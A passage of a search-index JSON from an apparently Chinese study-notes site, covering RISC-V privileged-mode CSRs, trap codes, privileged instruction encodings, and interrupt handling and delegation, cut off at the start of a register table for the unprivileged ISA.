mip Machine \u4e2d\u65ad\u6302\u8d77\u5bc4\u5b58\u5668 0x34A MRW mtinst Machine trap \u6307\u4ee4\u5bc4\u5b58\u5668 0x34B MRW mtval2 Machine trap \u503c\u5bc4\u5b58\u5668 Machine \u914d\u7f6e\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x30A MRW menvcfg Machine \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668 0x31A MRW menvcfgh Machine \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0x747 MRW mseccfg Machine \u5b89\u5168\u914d\u7f6e\u5bc4\u5b58\u5668 0x757 MRW mseccfgh Machine \u5b89\u5168\u914d\u7f6e\u5bc4\u5b58\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine \u5185\u5b58\u4fdd\u62a4\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x3A0-0x3AF MRW pmpcfg0-15 Machine \u7269\u7406\u5185\u5b58\u4fdd\u62a4\u914d\u7f6e\u5bc4\u5b58\u5668\uff08\u5947\u6570\u53ea\u6709 RV32 \u6709\uff09 0x3B0-0x3BF MRW pmpaddr0-15 Machine \u7269\u7406\u5185\u5b58\u4fdd\u62a4\u5730\u5740\u5bc4\u5b58\u5668 Machine \u8ba1\u6570/\u8ba1\u65f6\u5668 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0xB00 MRW mcycle Machine \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668 0xB02 MRW minstret Machine \u6307\u4ee4\u8ba1\u6570\u5668 0xB03-0xB1F MRW mhpmcounter3-31 Machine \u6027\u80fd\u8ba1\u6570\u5668 0xB80 MRW mcycleh Machine \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xB82 MRW minstreth Machine \u6307\u4ee4\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xB83-0xB9F MRW mhpmcounter3h-31h Machine \u6027\u80fd\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine \u8ba1\u6570\u5668\u8bbe\u7f6e \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x320 MRW mcounterinhibit Machine \u6027\u80fd\u8ba1\u6570\u5668\u7981\u6b62\u5bc4\u5b58\u5668 0x323-0x33F MRW mhpmevent3-31 Machine \u6027\u80fd\u8ba1\u6570\u5668\u4e8b\u4ef6\u9009\u62e9\u5bc4\u5b58\u5668","title":"Machine \u6a21\u5f0f"},{"location":"cs/pl/riscv/privileged/#csr_1","text":"\u540e\u9762\u5728\u5b9a\u4e49\u5404\u4e2a CSR \u5b57\u6bb5\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u4e00\u4e9b\u7f29\u5199\uff1a WPRI \uff08reserved Writes Preserve values, Reads Ignore values\uff09\uff1a\u5199\u4fdd\u7559\uff0c\u8bfb\u5ffd\u7565 WLRL \uff08Write/Read Only Legal values\uff09\uff1a\u53ea\u80fd\u5199/\u8bfb\u5408\u6cd5\u503c\uff08\u4e0d\u5408\u6cd5\u7684\u65f6\u5019\u63a8\u8350\u4f46\u4e0d\u5fc5\u987b\u629b\u51fa\u5f02\u5e38\uff09 WARL \uff08Write Any values, Read Legal values\uff09\uff1a\u5199\u4efb\u610f\u503c\uff0c\u8bfb\u5408\u6cd5\u503c","title":"CSR \u5b57\u6bb5\u7f29\u5199\u89c4\u8303"},{"location":"cs/pl/riscv/privileged/#machine_1","text":"","title":"Machine \u6a21\u5f0f"},{"location":"cs/pl/riscv/privileged/#m-csrs","text":"\u53ea\u5199\u4e00\u4e9b\u91cd\u8981\u3001\u6709\u7528\u7684\u3002 .csr-bit { background-color: #3f6ec6b0; border-radius: 3px; font-size: .4rem; padding: 4px; } .csr-behav { background-color: #e6695bb0; border-radius: 3px; font-size: .4rem; padding: 4px; }","title":"M \u6a21\u5f0f CSRs"},{"location":"cs/pl/riscv/privileged/#misa","text":"[31:30] / [63:62] WARL MXL\uff1a\u7f16\u7801 XLEN\uff0c1 \u8868\u793a RV32\uff0c2 \u8868\u793a RV64\uff0c3 \u8868\u793a RV128 [25:0] WARL Extensions\uff1a\u6269\u5c55\uff0c\u4ece 0 \u4f4d\u5230 25 \u4f4d\u4f9d\u6b21\u8868\u793a A-Z \u6269\u5c55\uff0c0 \u8868\u793a\u4e0d\u5b58\u5728\uff0c1 \u8868\u793a\u5b58\u5728","title":"misa"},{"location":"cs/pl/riscv/privileged/#mstatus","text":"\u4ec5\u4ec5\u662f\u4e00\u90e8\u5206\u4e2d\u65ad\u5904\u7406\u65f6\u4f1a\u7528\u5230\u7684\u5b57\u6bb5\uff1a 1 SIE\uff1aS \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 3 MIE\uff1aM \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 5 SPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a S \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 7 MPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a M \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 8 WARL SPP\uff1aS \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b [12:11] WARL MPP\uff1aM \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b 22 WARL TSR\uff1a\u4e3a 1 \u65f6\u7981\u6b62 S \u6a21\u5f0f\u4e0b\u6267\u884c sret\uff0c\u4e3a 0 \u65f6\u5141\u8bb8\uff0c\u6ca1\u6709 S \u6a21\u5f0f\u65f6\u4e3a\u53ea\u8bfb 0","title":"mstatus"},{"location":"cs/pl/riscv/privileged/#mtvec","text":"\u7528\u4e8e\u4fdd\u5b58 Machine \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740 [31:2] / [63:2] WARL Base\uff1a\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\uff084 \u5b57\u8282\u5bf9\u9f50\uff09 [1:0] WARL Mode\uff1a\u6a21\u5f0f\uff0c\u5206\u4e3a\u4ee5\u4e0b\u4e24\u79cd\uff1a 0 - Direct\uff1a\u76f4\u63a5\u6a21\u5f0f\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\u4e3a Base 1 - Vectored\uff1a\u5411\u91cf\u6a21\u5f0f\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\u4e3a Base + 4 * cause\uff08cause \u5728\u4e0b\u9762\u6709\u5b9a\u4e49\uff09","title":"mtvec"},{"location":"cs/pl/riscv/privileged/#medeleg-mideleg","text":"\u7edf\u79f0 machine trap delegation registers\uff0cmideleg\uff08machind interrupt delegation register\uff09\u7528\u4e8e\u4fdd\u5b58\u54ea\u4e9b\u4e2d\u65ad\u8981\u59d4\u6258\u7ed9 S \u6a21\u5f0f\u8fdb\u884c\u5904\u7406\u3002medeleg\uff08machine exception delegation register\uff09\u7528\u4e8e\u4fdd\u5b58\u54ea\u4e9b\u5f02\u5e38\u8981\u59d4\u6258\u7ed9 S \u6a21\u5f0f\u8fdb\u884c\u5904\u7406\u3002 \u4e2d\u65ad\u7801\uff1a 1: Supervisor Software Interrupt 3: Machine Software Interrupt 5: Supervisor Timer Interrupt 7: Machine Timer Interrupt 9: Supervisor External Interrupt 11: Machine External Interrupt \u5f02\u5e38\u7801\uff1a 0: Instruction Address Misaligned 1: Instruction Access Fault 2: Illegal Instruction 3: Breakpoint 4: Load Address Misaligned 5: Load Access Fault 6: Store/AMO Address Misaligned 7: Store/AMO Access Fault 8: Environment Call from U-mode 9: Environment Call from S-mode 11: Environment Call from M-mode 12: Instruction Page Fault 13: Load Page Fault 15: Store/AMO Page Fault \u9700\u8981\u59d4\u6258\u54ea\u4e9b\u4e2d\u65ad/\u5f02\u5e38\uff0c\u5c31\u5c06\u5bf9\u5e94\u5bc4\u5b58\u5668\u7684\u5bf9\u5e94\u4f4d\u8bbe\u7f6e\u4e3a 1\uff0c\u4e0d\u9700\u8981\u59d4\u6258\u5c31\u8bbe\u7f6e\u4e3a 0\u3002","title":"medeleg &amp; mideleg"},{"location":"cs/pl/riscv/privileged/#mip-mie","text":"\u5206\u522b\u662f machine interrupt pending \u548c machine interrupt enable\uff0c\u7528\u4e8e\u4fdd\u5b58\u4e2d\u65ad\u662f\u5426\u53d1\u751f\u4ee5\u53ca\u662f\u5426\u5141\u8bb8\u4e2d\u65ad\u3002 \u4e2d\u65ad i\uff08\u4e0a\u9762\u5b9a\u4e49\u7684\u4e2d\u65ad\u7801\uff09\u9677\u5165 M \u6a21\u5f0f\u5f53\u4ee5\u4e0b\u6761\u4ef6\u540c\u65f6\u6ee1\u8db3\u65f6\uff1a \u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4e3a M \u6a21\u5f0f\uff0c\u4e14 mstatus[MIE] \u4e3a 1\uff0c\u6216\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4f4e\u4e8e M mip[i] \u4e3a 1\uff0c\u4e14 mie[i] \u4e3a 1 \u5982\u679c\u5b58\u5728 mideleg \u5bc4\u5b58\u5668\uff0c\u5219\u9700\u8981 mideleg[i] \u4e3a 0\uff08\u4e0d\u59d4\u6258\uff09","title":"mip &amp; mie"},{"location":"cs/pl/riscv/privileged/#mepc-mcause","text":"mepc \u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u65f6\u7684\u6307\u4ee4\u5730\u5740\u3002 mcause \u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u7684\u539f\u56e0\uff08\u4e0a\u9762\u89c4\u5b9a\uff09\uff1a 31 / 63 Interrupt\uff1a\u4e3a 1 \u65f6\u8868\u793a\u662f\u4e2d\u65ad\uff0c\u4e3a 0 \u65f6\u8868\u793a\u662f\u5f02\u5e38 [30:0] / [62:0] WLRL Code\uff1a\u4e2d\u65ad/\u5f02\u5e38\u7801\uff08\u4ee5\u503c\u7684\u65b9\u5f0f\u5b58\u50a8\uff0c\u800c\u4e0d\u662f\u5bf9\u5e94\u4f4d\uff09","title":"mepc &amp; mcause"},{"location":"cs/pl/riscv/privileged/#mtval","text":"\u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u65f6\u7684\u9644\u52a0\u4fe1\u606f\uff1a \u5982\u679c\u662f\u7531\u5b58\u50a8\u5668\u8bbf\u95ee\u5f15\u8d77\u7684\u5f02\u5e38\uff0c\u5219 mtval \u4fdd\u5b58\u7684\u662f\u8981\u8bbf\u95ee\u7684\u5730\u5740 \u5982\u679c\u662f\u975e\u6cd5\u6307\u4ee4\u9020\u6210\u7684\u5f02\u5e38\uff0c\u5219\u5c06\u8be5\u6307\u4ee4\u7684\u7f16\u7801\u4fdd\u5b58\u5728 mtval \u4e2d","title":"mtval"},{"location":"cs/pl/riscv/privileged/#m","text":"RISC-V \u7279\u6743\u7ea7\u89c4\u8303\u89c4\u5b9a\u4e86\u4e24\u4e2a M \u6a21\u5f0f\u5185\u5b58\u6620\u5c04\u5bc4\u5b58\u5668\uff0c\u5206\u522b\u662f mtime \u548c mtimecmp\u3002 mtime \u548c mtimecmp \u5728 RV32 \u548c RV64 \u4e2d\u90fd\u662f 64 \u4f4d\u7684\u3002mtime \u5e94\u8be5\u7531\u673a\u5668\u5b9e\u73b0\uff0c\u4ee5\u56fa\u5b9a\u9891\u7387\u9012\u589e\u3002\u5f53 mtime \u7684\u503c\u5927\u4e8e\u7b49\u4e8e mtimecmp \u65f6\uff0c\u8981\u89e6\u53d1 machine timer interrupt\uff08\u5f53 mie \u5bc4\u5b58\u5668\u4e2d\u7684 MTIE \u4f4d\u4e3a 1 \u65f6\uff09\u3002 Note \u5728 qemu \u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e2d\uff0cmtime \u7684\u5730\u5740\u4f4d\u4e8e 0x200bff8\uff0cmtimecmp \u7684\u5730\u5740\u4f4d\u4e8e 0x2004000\u3002","title":"M \u6a21\u5f0f\u5185\u5b58\u6620\u5c04\u5bc4\u5b58\u5668"},{"location":"cs/pl/riscv/privileged/#m_1","text":"ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aecall \u6307\u4ee4\u4f5c\u7528 \uff1aM \u6a21\u5f0f\u8c03\u7528 ecall \u4f1a\u4ea7\u751f environment-call-from-M-mode \u5f02\u5e38 \u6ce8\u610f \uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ecall \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ecall \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4e14 ecall \u6307\u4ee4\u4e0d\u4f1a\u589e\u52a0 minstret \u5bc4\u5b58\u5668\u7684\u503c ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aebreak \u6307\u4ee4\u4f5c\u7528 \uff1a\u4efb\u4f55\u6a21\u5f0f\u8c03\u7528 ebreak \u90fd\u4f1a\u4ea7\u751f breakpoint \u5f02\u5e38\uff0c\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9\u8c03\u8bd5\u5668 \u6ce8\u610f \uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ebreak \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ebreak \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4e14 ebreak \u6307\u4ee4\u4e0d\u4f1a\u589e\u52a0 minstret \u5bc4\u5b58\u5668\u7684\u503c mret I \u578b 31 20 19 15 14 12 11 7 6 0 001100000010 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1amret \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 M \u6a21\u5f0f\u5904\u7406 trap \u4e4b\u540e\u8fd4\u56de\u524d\u4e00\u7279\u6743\u6a21\u5f0f\uff0c\u5e76\u5c06 pc \u8bbe\u7f6e\u4e3a mepc \u5bc4\u5b58\u5668\u7684\u503c \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a mstatus[MPP] \u5c06 mstatus[MIE] \u8bbe\u7f6e\u4e3a mstatus[MPIE] \u5c06 mstatus[MPIE] \u8bbe\u7f6e\u4e3a 1 \u5c06 mstatus[MPP] \u8bbe\u7f6e\u4e3a U \u5c06 pc \u8bbe\u7f6e\u4e3a mepc \u5bc4\u5b58\u5668\u7684\u503c wfi I \u578b 31 20 19 15 14 12 11 7 6 0 000100000101 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1awfi \u6307\u4ee4\u4f5c\u7528 \uff1a\u4efb\u4f55\u7279\u6743\u6a21\u5f0f\u5747\u53ef\u7528\uff0c\u6267\u884c\u65f6\u5f53\u524d hart \u4f1a\u8fdb\u5165\u4f11\u7720\uff0c\u7b49\u5f85\u4e2d\u65ad\u6765\u5524\u9192\uff0c\u76f8\u5f53\u4e8e nop","title":"M \u6a21\u5f0f\u7279\u6743\u6307\u4ee4"},{"location":"cs/pl/riscv/privileged/#supervisor_1","text":"","title":"Supervisor \u6a21\u5f0f"},{"location":"cs/pl/riscv/privileged/#s-csrs","text":"","title":"S \u6a21\u5f0f CSRs"},{"location":"cs/pl/riscv/privileged/#sstatus","text":"sstatus \u662f mstatus \u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u7528\u4e8e\u4fdd\u5b58 S \u6a21\u5f0f\u7684\u72b6\u6001\uff0c\u5176\u90e8\u5206\u4e2d\u65ad\u76f8\u5173\u7684\u7ed3\u6784\u5982\u4e0b\uff1a 1 SIE\uff1aS \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 5 SPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a S \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd 8 WARL SPP\uff1aS \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b","title":"sstatus"},{"location":"cs/pl/riscv/privileged/#_3","text":"stvec\u3001sip\u3001sie\u3001sepc\u3001scause\u3001stval \u610f\u4e49\u5747\u4e0e M \u6a21\u5f0f\u7c7b\u4f3c\u3002","title":"\u5176\u5b83"},{"location":"cs/pl/riscv/privileged/#s","text":"ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aecall \u6307\u4ee4\u4f5c\u7528 \uff1aS \u6a21\u5f0f\u8c03\u7528 ecall \u4f1a\u4ea7\u751f environment-call-from-S-mode \u5f02\u5e38 \u6ce8\u610f \uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ecall \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ecall \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aebreak \u6307\u4ee4\u4f5c\u7528 \uff1a\u4efb\u4f55\u6a21\u5f0f\u8c03\u7528 ebreak \u90fd\u4f1a\u4ea7\u751f breakpoint \u5f02\u5e38\uff0c\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9\u8c03\u8bd5\u5668 \u6ce8\u610f \uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ebreak \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ebreak \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 sret I \u578b 31 20 19 15 14 12 11 7 6 0 000100000010 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1asret \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 S \u6a21\u5f0f\u5904\u7406 trap \u4e4b\u540e\u8fd4\u56de\u524d\u4e00\u7279\u6743\u6a21\u5f0f\uff0c\u5e76\u5c06 pc \u8bbe\u7f6e\u4e3a sepc \u5bc4\u5b58\u5668\u7684\u503c \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a sstatus[SPP] \u5c06 sstatus[SIE] \u8bbe\u7f6e\u4e3a sstatus[SPIE] \u5c06 sstatus[SPIE] \u8bbe\u7f6e\u4e3a 1 \u5c06 sstatus[SPP] \u8bbe\u7f6e\u4e3a U \u5c06 pc \u8bbe\u7f6e\u4e3a sepc \u5bc4\u5b58\u5668\u7684\u503c wfi I \u578b 31 20 19 15 14 12 11 7 6 0 000100000101 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1awfi \u6307\u4ee4\u4f5c\u7528 \uff1a\u4efb\u4f55\u7279\u6743\u6a21\u5f0f\u5747\u53ef\u7528\uff0c\u6267\u884c\u65f6\u5f53\u524d hart \u4f1a\u8fdb\u5165\u4f11\u7720\uff0c\u7b49\u5f85\u4e2d\u65ad\u6765\u5524\u9192\uff0c\u76f8\u5f53\u4e8e nop","title":"S \u6a21\u5f0f\u7279\u6743\u6307\u4ee4"},{"location":"cs/pl/riscv/privileged/#risc-v","text":"RISC-V \u5c06\u80fd\u5f15\u8d77\u5f53\u524d\u7a0b\u5e8f\u4e2d\u65ad\uff0c\u4f7f CPU \u8f6c\u5230\u7279\u5b9a\u4ee3\u7801\u7684\u4e8b\u4ef6\u79f0\u4e3a \u9677\u9631\uff08Trap\uff09 \uff0c\u5176\u5206\u4e3a\u4e24\u7c7b\uff0c \u4e2d\u65ad\uff08Interrupt\uff09 \u548c \u5f02\u5e38\uff08Exception\uff09 \uff1a \u4e2d\u65ad\u662f\u786c\u4ef6\u4ea7\u751f\u7684\uff0c\u5f02\u6b65\u5904\u7406\uff0c\u662f\u6b63\u5e38\u4e8b\u4ef6\u3002\u5305\u62ec\u8f6f\u4ef6\u4e2d\u65ad\u3001\u65f6\u949f\u4e2d\u65ad\u3001\u5916\u90e8\u4e2d\u65ad\u7b49\u3002 \u5f02\u5e38\u662f\u8f6f\u4ef6\u4ea7\u751f\u7684\uff0c\u540c\u6b65\u5904\u7406\uff0c\u662f\u975e\u6b63\u5e38\u4e8b\u4ef6\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u7ec8\u6b62\u3002\u4f8b\u5982\u6307\u4ee4\u5f02\u5e38\u7b49\u3002","title":"RISC-V \u4e2d\u65ad\u548c\u5f02\u5e38\u5904\u7406"},{"location":"cs/pl/riscv/privileged/#_4","text":"RISC-V \u4e2d\u5916\u90e8\u4e2d\u65ad\u5fc5\u987b\u901a\u8fc7 CSR \u6765\u5f00\u542f\uff0c\u5f00\u542f\u4e2d\u65ad\u7531\u4e24\u4e2a\u6b65\u9aa4\uff1a mstatus[MIE] \u662f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd\u4f4d\uff0c\u8bbe\u7f6e\u4e3a 1 \u624d\u4f1a\u5168\u5c40\u5f00\u542f\u4e2d\u65ad mie \u5bc4\u5b58\u5668\u4e2d\u662f\u9488\u5bf9\u5404\u79cd\u4e2d\u65ad\u7c7b\u578b\u7684\u4f7f\u80fd\u4f4d\uff0c\u8981\u5c06\u9700\u8981\u7684\u4f4d\u8bbe\u7f6e\u4e3a 1 \u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f\u7684\u5165\u53e3\u5730\u5740\u7531 mtvec \u5bc4\u5b58\u5668\u6307\u5b9a\uff0c\u5982\u524d\u9762\u5199\u5230\u7684\uff0c\u5b83\u5206\u4e3a\u4e24\u79cd\u6a21\u5f0f\uff1a \u76f4\u63a5\u6a21\u5f0f\uff08Direct\uff09\uff0c\u6240\u6709 trap \u90fd\u8df3\u8f6c\u5230 mtvec \u5bc4\u5b58\u5668\u6307\u5b9a\u7684\u5730\u5740\u8fdb\u884c\u5904\u7406 \u5411\u91cf\u5316\u6a21\u5f0f\uff08Vectored\uff09\uff0c\u4e2d\u65ad\u5c06\u6839\u636e\u4e2d\u65ad\u7c7b\u578b\u8df3\u8f6c\u5230\u4e0d\u540c\u504f\u79fb\u4f4d\u7f6e\u7684\u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f\uff0c\u5f02\u5e38\u4ecd\u4f7f\u7528\u540c\u4e00\u4e2a\u54cd\u5e94\u7a0b\u5e8f \u5f53\u4e2d\u65ad\u53d1\u751f\u65f6\uff0cCPU \u4f1a\uff1a \u5c06\u53d1\u751f\u5f02\u5e38\u7684\u6307\u4ee4\uff08\u6216\u4e0b\u4e00\u6761\u6307\u4ee4\uff09\u7684\u5730\u5740\u4fdd\u5b58\u5230 mepc \u5bc4\u5b58\u5668 \u5c06\u4e2d\u65ad\u7c7b\u578b\u7801\u4fdd\u5b58\u5230 mcause \u5bc4\u5b58\u5668 \u5982\u679c\u4e2d\u65ad\u5e26\u6709\u9644\u52a0\u4fe1\u606f\uff0c\u5c06\u5176\u4fdd\u5b58\u5230 mtval \u5bc4\u5b58\u5668 \u5982\u679c\u662f\u5916\u90e8\u5f15\u53d1\u7684\u4e2d\u65ad\uff0c\u4ee4 mstatus[MPIE] = mstatus[MIE]\uff08\u4fdd\u5b58\uff09\uff0c\u7136\u540e\u4ee4 mstatus[MIE] = 0\uff08\u5173\u95ed\u4e2d\u65ad\uff09 \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4fdd\u5b58\u5230 mstatus[MPP] \u4e2d \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a Machine \u6a21\u5f0f \u6839\u636e mtvec \u5bc4\u5b58\u5668\u7684\u8bbe\u7f6e\uff0c\u8df3\u8f6c\u5230\u5bf9\u5e94\u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f \u4e2d\u65ad\u5904\u7406\u7ed3\u675f\u540e\u8981\u4f7f\u7528 mret \u6307\u4ee4\u8fdb\u884c\u8fd4\u56de\uff0c\u5b83\u4f1a\uff1a \u4ee4 mstatus[MIE] = mstatus[MPIE]\uff08\u6062\u590d\uff09\uff0c\u7136\u540e\u4ee4 mstatus[MPIE] = 1 \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a mstatus[MPP] \u4e2d\u4fdd\u5b58\u7684\u503c \u5c06 mstatus[MPP] \u8bbe\u7f6e\u4e3a U \u6a21\u5f0f \u5c06 pc \u503c\u8bbe\u7f6e\u4e3a mepc \u503c\uff0c\u5373\u8df3\u8f6c\u56de\u4e2d\u65ad\u524d\u7684\u7a0b\u5e8f","title":"\u4e2d\u65ad\u5904\u7406"},{"location":"cs/pl/riscv/privileged/#_5","text":"RISC-V \u4e2d\uff0c\u6240\u6709\u4e2d\u65ad\u90fd\u4f1a\u5728 Machine \u6a21\u5f0f\u4e0b\u8fdb\u884c\u5904\u7406\u3002\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u4e2d\u65ad\u901a\u5e38\u662f\u8981\u4ea4\u7ed9\u5185\u6838\u6765\u5904\u7406\u7684\uff0c\u5185\u6838\u6001\u5bf9\u5e94\u7684\u4e5f\u5c31\u662f Supervisor \u6a21\u5f0f\u3002RISC-V \u4e2d\u63d0\u4f9b\u4e86\u59d4\u6258\u673a\u5236\uff0c\u53ef\u4ee5\u5c06\u4e2d\u65ad\u76f4\u63a5\u59d4\u6258\u7ed9 Supervisor \u6a21\u5f0f\u5904\u7406\uff0c\u800c\u4e0d\u7ecf\u8fc7 Machine \u6a21\u5f0f\u3002 \u76f8\u5173\u7684\u59d4\u6258\u8bbe\u7f6e\u5728 medeleg \u548c mideleg \u4e24\u4e2a\u5bc4\u5b58\u5668\u4e2d\uff0c\u76f8\u5173\u610f\u4e49\u5728\u524d\u9762 Machine-Level CSR \u90e8\u5206\u5199\u8fc7\u4e86\u3002 \u5728\u59d4\u6258\u60c5\u51b5\u4e0b\uff0c\u548c\u4e0a\u9762\u4e0d\u540c\u7684\u662f\u5c06\u4f1a\u4f7f\u7528 Supervisor-Level \u7684 CSR\uff0c\u5982 sepc\u3001scause\u3001stval \u7b49\uff0c\u800c\u4e14\u4e5f\u4f1a\u4f7f\u7528 sret \u8fdb\u884c\u4e2d\u65ad\u8fd4\u56de\u3002","title":"\u59d4\u6258\u5904\u7406"},{"location":"cs/pl/riscv/unprivileged/","text":"RISC-V \u975e\u7279\u6743\u7ea7 ISA \u00b6 Abstract RISC-V \u6307\u4ee4\u96c6\u7684\u975e\u7279\u6743\u7ea7\uff08\u7528\u6237\u7ea7\uff09\u90e8\u5206\u3002 \u53c2\u8003\uff1a The RISC-V Instruction Set Manual Volume I: Unprivileged ISA v.20191213 \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u201c\uff08\u5927\u4e00\u6625\u590f\uff09\u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u201c\uff08\u5927\u4e8c\u79cb\u51ac\uff09\u8bfe\u7a0b RV32I \u57fa\u7840 \u00b6 \u5bc4\u5b58\u5668 \u00b6 \u4e00\u4e2a PC \u5bc4\u5b58\u5668\uff08program counter\uff09 32 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\uff08x0~x31\uff09 \u5176\u4e2d x0 \u6c38\u8fdc\u662f 0 \u5bc4\u5b58\u5668\u7684\u5e38\u7528\u7528\u9014\u5982\u4e0b\uff1a \u5bc4\u5b58\u5668 ABI \u540d\u79f0 \u7528\u9014\u63cf\u8ff0 saver x0 zero \u786c\u4ef6 0 x1 ra \u8fd4\u56de\u5730\u5740\uff08return address\uff09 caller x2 sp \u6808\u6307\u9488\uff08stack pointer\uff09 callee x3 gp \u5168\u5c40\u6307\u9488\uff08global pointer\uff09 x4 tp \u7ebf\u7a0b\u6307\u9488\uff08thread pointer\uff09 x5 t0 \u4e34\u65f6\u53d8\u91cf/\u5907\u7528\u94fe\u63a5\u5bc4\u5b58\u5668\uff08alternate link reg\uff09 caller x6-7 t1-2 \u4e34\u65f6\u53d8\u91cf caller x8 s0/fp \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668/\u5e27\u6307\u9488\uff08frame pointer\uff09 callee x9 s1 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x10-11 a0-1 \u51fd\u6570\u53c2\u6570/\u8fd4\u56de\u503c caller x12-17 a2-7 \u51fd\u6570\u53c2\u6570 caller x18-27 s2-11 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x28-31 t3-6 